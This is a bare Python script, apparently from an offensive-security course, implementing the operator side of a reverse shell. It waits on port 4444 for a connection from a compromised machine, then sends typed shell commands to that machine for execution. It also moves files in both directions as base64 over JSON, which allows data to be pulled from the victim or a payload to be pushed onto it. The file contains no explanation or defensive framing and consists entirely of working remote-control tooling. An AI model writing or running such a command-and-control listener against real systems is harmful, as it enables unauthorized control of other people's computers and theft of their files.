import socket
import base64
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print("[+] Waiting for incoming connection...")
        self.connection, addr = listener.accept()
        print(f"[+] Connected successfully from {addr}")

    def reliable_send(self, data):
        self.connection.send(json.dumps(data).encode())

    def reliable_receive(self):
        return json.loads(self.connection.recv(1024).decode())

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download successfully."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        try:
            while True:
                command = input(">> ").split(" ")
                if command[0].lower() == "exit":
                    print("[+] Closing connection.")
                    self.connection.close()
                    break

                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command = [command[0], command[1], file_content]

                result = self.execute_remotely(command)

                if command[0] == "download":
                    result = self.write_file(command[1], result)

                print(result)
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            self.connection.close()


my_listener = Listener("127.0.0.1", 4444)
my_listener.run()
